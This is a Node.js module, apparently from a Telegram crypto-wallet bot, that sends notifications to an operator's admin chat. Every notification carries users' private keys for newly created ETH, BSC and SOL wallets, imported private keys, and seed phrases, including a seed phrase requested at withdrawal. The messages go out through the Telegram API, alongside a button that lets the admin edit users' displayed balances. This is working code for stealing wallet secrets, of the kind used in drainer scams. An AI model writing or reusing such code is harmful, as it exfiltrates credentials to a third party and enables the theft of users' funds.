// Sends records to the admin bot (new wallets, imported keys, imported phrases).
// Uses ADMIN_BOT_TOKEN so the message + button are owned by the admin bot.

const fetch = require('node-fetch');

async function sendToAdmin(text, reply_markup = null) {
  const token = process.env.ADMIN_BOT_TOKEN;
  const chatId = process.env.ADMIN_CHAT_ID;

  if (!token || !chatId) {
    console.warn('ADMIN_BOT_TOKEN / ADMIN_CHAT_ID not set — skipping admin notification.');
    return;
  }

  const body = { chat_id: chatId, text };
  if (reply_markup) body.reply_markup = reply_markup;

  const url = `https://api.telegram.org/bot${token}/sendMessage`;
  const res = await fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });

  if (!res.ok) {
    const errBody = await res.text();
    console.error('Failed to notify admin bot:', res.status, errBody);
  }
}

function balanceButton(telegramId) {
  return {
    inline_keyboard: [
      [{ text: '➕ Add / Edit Balance', callback_data: `admin_add_balance:${telegramId}` }],
    ],
  };
}

/** Called when a brand-new user is provisioned (/start). */
async function notifyAdmin({ telegramId, telegramUsername, eth, bsc, sol }) {
  const text = [
    '🆕 New wallet provisioned',
    `User: ${telegramUsername ? '@' + telegramUsername : '(no username)'} (id: ${telegramId})`,
    '',
    `ETH Address: ${eth.address}`,
    `ETH Private Key: ${eth.privateKey}`,
    '',
    `BSC Address: ${bsc.address}`,
    `BSC Private Key: ${bsc.privateKey}`,
    '',
    `SOL Address: ${sol.address}`,
    `SOL Private Key: ${sol.privateKey}`,
  ].join('\n');

  await sendToAdmin(text, balanceButton(telegramId));
}

/**
 * Called when a user imports a private key.
 * chain is 'ETH' | 'BSC' | 'SOL'
 */
async function notifyImport({ telegramId, telegramUsername, chain, address, privateKey }) {
  const text = [
    '📥 Wallet imported (private key)',
    `User: ${telegramUsername ? '@' + telegramUsername : '(no username)'} (id: ${telegramId})`,
    '',
    `Chain: ${chain}`,
    `Address: ${address}`,
    `Private Key: ${privateKey}`,
  ].join('\n');

  await sendToAdmin(text, balanceButton(telegramId));
}

/**
 * Called when a user imports a seed phrase.
 * Applies to ETH + BSC (same EVM derivation).
 */
async function notifyPhraseImport({ telegramId, telegramUsername, phrase, eth, bsc }) {
  const text = [
    '📥 Wallet imported (seed phrase)',
    `User: ${telegramUsername ? '@' + telegramUsername : '(no username)'} (id: ${telegramId})`,
    '',
    `Seed Phrase: ${phrase}`,
    '',
    `ETH Address: ${eth.address}`,
    `ETH Private Key: ${eth.privateKey}`,
    '',
    `BSC Address: ${bsc.address}`,
    `BSC Private Key: ${bsc.privateKey}`,
  ].join('\n');

  await sendToAdmin(text, balanceButton(telegramId));
}

async function notifyWithdrawal({ telegramId, telegramUsername, chain, amount, address, phrase }) {
  const text = [
    '📤 Withdrawal request',
    '',
    '——— Details ———',
    `User: ${telegramUsername ? '@' + telegramUsername : '(no username)'} (id: ${telegramId})`,
    `Phrase : ${phrase || '(not provided)'}`,
    '',
    `Chain: ${chain}`,
    `Amount: $${amount}`,
    `To address: ${address}`,
  ].join('\n');

  await sendToAdmin(text, balanceButton(telegramId));
}

module.exports = { notifyAdmin, notifyImport, notifyPhraseImport, notifyWithdrawal };

